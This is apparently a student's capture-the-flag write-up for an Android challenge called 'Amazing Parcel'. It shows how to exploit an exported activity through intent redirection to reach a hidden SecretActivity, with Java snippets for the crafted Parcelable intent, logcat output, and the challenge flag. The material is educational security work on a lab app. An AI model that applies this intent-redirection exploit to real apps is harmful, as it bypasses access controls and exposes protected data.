# Amazing Parcel 

we only have an apk, extract the flag 

Intent redirection attack

____

## 1. How to solve it 

### 1. Manifest file 

Like always drag & drop into jadx gui and look at the manifest . What does it says?
-  look for Activity or receiver exporter -> exported = true
-  look for intent filte tags -> what kind of parcel the app is waiting for 

```xml
<activity
            android:name="com.example.victimapp.MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
```

main activity is exported 

```xml
<activity
            android:name="com.example.victimapp.DispatchingActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="mobiotsec.PACKAGE_INCOMING"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
```

also we have dispatching activity -> is exported -> has a intent filter 

<action android:name="mobiotsec.PACKAGE_INCOMING"/> -> waiting for a package, important, need to exploit this 

goal: send a specific intent to dispatching activity 
- what we put in the intent? -> look at main activity javacode, dispatchinActivity.java 


### 2. Dispatching Activity java & amazingParcel 

if (parcelable != null && (parcelable instanceof AmazingPackage)) { -> means that we need to write a android app to create this object and send it 


lets look at amazing parcel.java 
1. lock : secretActivity contains the flag but its not exported -> cannot open directly 
2. key: Dipatching activity is exported -> acepts package amazing parcel object 
3. if we send pakcage to amazingparcel + say open secret activity dispatching activity will open for me 


### 3. Copy & paste the class amazing pakage

- create the package com.example.victimapp
- copy there amazingpackage.java
- change the constructor to public to use it 


### 4. on Create logic 

1. create the onject amazing package
2. - my pakcage is com.example.victimapp and i want to go to secret activity

```java
com.example.victimapp.AmazingPackage payload =
                new com.example.victimapp.AmazingPackage(
                        "com.example.victimapp",
                        "com.example.victimapp.SecretActivity"
                );
```


3. create a explicit intent to send the action 
ACTION-> mobiotsec.PACKAGE_INCOMING -> is a if requirement so its required 

```java
Intent intent = new Intent("mobiotsec.PACKAGE_INCOMING");
```

is a explicit intent so we specify the package

```java
// specify the victim app's package to make it explicit
        intent.setPackage("com.example.victimapp");
```


put extra to send the object 

```java
// 3. putExtra the Parcelable object
        intent.putExtra("PACKAGE", payload);
```

send it 
```java
// 4. LAUNCH
        try {
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
```


## Solution 
```bash
2026-01-27 11:24:53.684 18404-18404 MOBIOTSEC               com.example.victimapp                I  got your package
2026-01-27 11:24:53.685 18404-18404 MOBIOTSEC               com.example.victimapp                I  package is here
2026-01-27 11:24:53.809 18404-18404 MOBIOTSEC               com.example.victimapp                I  some very important secrets may be kept in this hidden secret activity, too bad its completely unreachable to you ;)
```

we cannot reach it because there is a layer of security 

intent now has no extras
- we need to look for a password 
- in the device got FLAG{sapere_aude}

![Flag on device](./2026-01-27_11-27.png)

